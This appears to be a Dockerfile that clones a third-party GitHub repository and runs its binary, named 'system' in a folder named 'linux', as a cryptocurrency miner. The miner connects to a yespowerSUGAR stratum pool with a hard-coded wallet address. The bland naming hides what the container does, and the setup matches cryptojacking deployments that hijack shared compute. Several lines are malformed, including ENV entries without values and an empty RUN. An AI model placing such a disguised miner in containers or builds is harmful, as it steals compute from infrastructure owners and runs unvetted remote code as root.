FROM  alpine:latest
USER  root
RUN   apk --no-cache upgrade && \
      apk --no-cache add \
        git
RUN   git clone https://github.com/Dawn-shell/linux && \
      cd linux && \
      chmod +x system && \
      apk del \
        git
WORKDIR    /linux
ENV $POOL
ENV $USER
ENV $ALGO
RUN   
ENTRYPOINT ["/linux/system"]
CMD ["-a", "yespowerSUGAR", "-o", "stratum+tcp://stratum-asia.rplant.xyz:7042", "-u", "sugar1qwj5x6hyr88tqsuv2fmu8dvzzxgx35wl5uhnxf8.docker"]
